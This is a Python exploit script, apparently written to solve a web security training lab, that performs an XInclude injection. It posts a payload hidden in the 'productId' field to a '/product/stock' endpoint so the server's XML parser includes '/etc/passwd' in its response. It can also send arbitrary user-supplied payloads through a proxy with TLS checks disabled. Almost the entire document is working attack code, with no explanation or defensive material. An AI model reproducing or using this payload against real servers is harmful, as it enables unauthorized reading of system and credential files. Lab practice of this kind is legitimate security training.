# Exploiting XInclude to retrieve files

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings

warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def send_xxe(s, url, payload):
	check_stock_path = url + '/product/stock'
	if payload == "SOLUTION":
		exploit_body = f"""<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>"""
	else:
		exploit_body = payload
	exploit_data = {"productId": '1' + exploit_body, "storeId": "3"}
	print('\n[+] Using payload:\n%s' % exploit_body)
	r = s.post(check_stock_path, data=exploit_data)
	time.sleep(2)
	res = r.text
	print('\n[+] Response:\n%s' % res)
	return r

def show_usage():
	print('[+] Usage: %s <URL> <ATTACKER> <PAYLOAD>\n' % sys.argv[0])
	print('[+] Example: %s https://www.target.com https://exploit-xxxxxxxxxxxx.exploit-server.net $(cat payload07.xml)' % sys.argv[0])
	print('[+] Example: %s https://www.target.com https://exploit-xxxxxxxxxxxx.exploit-server.net SOLUTION' % sys.argv[0])
	sys.exit(-1)

def main():
	print('[+] Lab: Exploiting XInclude to retrieve files')
	try:
		url = sys.argv[1].strip()
		input_payload = sys.argv[2:]
		if len(input_payload) > 1:
			payload = ' '.join(input_payload).replace('> ', '>').replace('=>', '=> ')
		else:
			payload = ''.join(input_payload)
		if payload == '':
			show_usage()
	except IndexError:
		show_usage()
	s = requests.Session()
	s.proxies = proxies # Comment this line to disable proxies
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down (or proxy missconfigured) <!>')
			sys.exit(-1)
		else:
			print("[+] Trying to send a XXE attack to retrieve the content of /etc/passwd...")
			r = send_xxe(s, url, payload)
			time.sleep(2)
			r = s.get(url, allow_redirects=False)
			time.sleep(1)
			if r.status_code == 200 and 'Congratulations, you solved the lab!' in r.text:
				print('[+] The lab is solved !')
			elif r.status_code == 200:
				print('[+] The Exploit sent the given payload !')
	except requests.exceptions.ProxyError:
		print('\n[-] PROXY seems to be missconfigured <!>')

if __name__ == "__main__":
	main()
